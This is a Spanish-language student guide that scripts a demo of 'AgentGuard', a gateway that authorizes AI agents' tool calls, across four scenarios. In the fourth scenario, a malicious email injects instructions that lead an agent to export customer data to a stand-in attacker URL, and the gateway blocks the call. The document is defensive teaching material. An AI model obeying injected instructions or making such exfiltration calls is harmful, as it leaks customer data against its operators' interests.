# 🎬 Guía de Defensa: Secuencia de la Demo Principal (4 Escenarios Críticos)
**Archivo asociado:** [`agentguard_secuencia_demo.drawio`](file:///f:/General/ITU/OneDrive%20-%20Universidad%20Nacional%20de%20Cuyo/Desarrollo%20de%20Software/Quinto%20semestre/Desarrollo%20WEB/agentguard_secuencia_demo.drawio)  
**Proyecto:** AgentGuard — Runtime Authorization & Governance for AI Agents  
**Cátedra:** Desarrollo Web — 5to Semestre, ITU - Universidad Nacional de Cuyo  

---

## 1. Guión y Estrategia de Presentación ante el Tribunal

> **Regla de oro de la presentación:**  
> *«Nunca arrancar mostrando cómo se crea un usuario en un formulario CRUD. El profesor ya vio mil CRUDs. Debemos abrir la demo directamente con la secuencia de ejecución de un agente interactuando en vivo contra el Gateway, demostrando la frontera de seguridad en tiempo real».*

Esta secuencia de 4 casos utiliza **la misma organización y el mismo agente de IA (Agente de Ventas)**, demostrando que la autorización no es estática (por rol de agente), sino **contextual y dinámica por acción**:

---

## 2. Los 4 Escenarios Demostrables Paso a Paso

### Escenario 1: Operación Normal (`ALLOW`)
* **Acción solicitada:** El agente invoca la tool `create_quote` para emitir un presupuesto de USD 2.500 para un cliente.
* **Evaluación del PDP:** La política del agente de ventas permite generar cotizaciones siempre que el monto sea inferior a USD 10.000 (`amount < 10000`).
* **Comportamiento del Sistema:** 
  1. El Gateway intercepta la llamada.
  2. El PDP valida la condición matemática y emite `ALLOW`.
  3. La petición viaja a la API REST de destino (CRM/Facturación), se ejecuta con éxito y el cliente recibe su ID de cotización.
  4. En segundo plano, se registra el `Execution Trace` en PostgreSQL con código 200.

---

### Escenario 2: Intento de Abuso de Privilegio (`DENY`)
* **Acción solicitada:** El agente intenta ejecutar `update_price(product_id: 88, new_price: $10)` para alterar el precio de lista de un producto.
* **Evaluación del PDP:** El agente tiene asignadas herramientas de venta, pero la acción `update_price` está reservada para el rol de administradores de catálogo.
* **Comportamiento del Sistema:** 
  1. El Gateway intercepta la llamada.
  2. El PDP comprueba el `capability set` y emite `DENY`.
  3. **Punto clave para el profesor:** *La petición se frena en seco en el Gateway; la base de datos de productos nunca recibe la llamada ni se entera del intento*.
  4. Se responde al agente con un error HTTP `403 Forbidden` (`Agent lacks capability for update_price`) y queda asentado el intento bloqueado en las trazas.

---

### Escenario 3: Operación de Alto Impacto con Intervención Humana (`REQUIRE_APPROVAL`)
* **Acción solicitada:** Un cliente solicita una devolución y el agente invoca `refund(customer_id: 302, amount: $4,500)`.
* **Evaluación del PDP:** La política establece que devoluciones menores a USD 500 son automáticas, pero cualquier importe superior requiere autorización explícita humana (`REQUIRE_APPROVAL refund WHEN amount >= 500`).
* **Comportamiento del Sistema:** 
  1. El Gateway suspende la ejecución y pone la solicitud en estado `PENDING_APPROVAL`.
  2. Se emite un evento instantáneo por WebSocket al Dashboard web del operador.
  3. En la pantalla del profesor, aparece la notificación en vivo en la bandeja **Approvals Inbox**.
  4. El operador humano hace click en **"Aprobar"**, ingresando un motivo (*"Caso validado con gerencia"*).
  5. El Gateway descongela la llamada, la despacha hacia la API REST de pagos (Stripe API) y completa el reembolso.

---

### Escenario 4: Ataque de Prompt Injection y Alerta Crítica (`DENY + ALERT`)
* **Acción solicitada:** A través de un correo electrónico malicioso procesado por el agente, un atacante logra inyectar instrucciones para que el modelo invoque `export_customers(destination: 'https://attacker.io/leak')`.
* **Evaluación del PDP:** La política de seguridad corporativa prohíbe taxativamente la exfiltración de datos a endpoints no homologados (`DENY export_customers WHEN destination is external`).
* **Comportamiento del Sistema:** 
  1. El agente fue completamente engañado por el prompt injection, **pero AgentGuard no confía en el agente**.
  2. El Gateway evalúa la acción objetiva solicitada y el destino.
  3. Emite `DENY` inmediato, abortando la conexión.
  4. El servicio de auditoría detecta la transgresión de alta severidad y levanta una **Alerta Crítica** (`CRITICAL ALERT`), que ilumina el panel de incidentes del Dashboard en color rojo para investigación forense.

---

## 3. El Cierre Magistral: El "Execution Trace"

Al concluir la demostración de los 4 pasos, se proyecta la pantalla de **Execution Traces** en el frontend web:
* Se muestra la tabla consolidada con las 4 filas correlacionadas:
  * ID de traza unificado.
  * Agente invocador.
  * Herramienta y Acción.
  * Decisión tomada (`ALLOW`, `DENY`, `REQUIRE_APPROVAL`, `DENY+ALERT`).
  * Tiempo de respuesta y política que justificó la decisión.

> **Frase de cierre para el tribunal:**  
> *«Esta secuencia demuestra que AgentGuard no es una promesa teórica: en una única experiencia integramos seguridad perimetral, sockets en tiempo real, persistencia transaccional, interfaces web reactivas y un motor de reglas que neutraliza las vulnerabilidades agentic más críticas de la actualidad».*
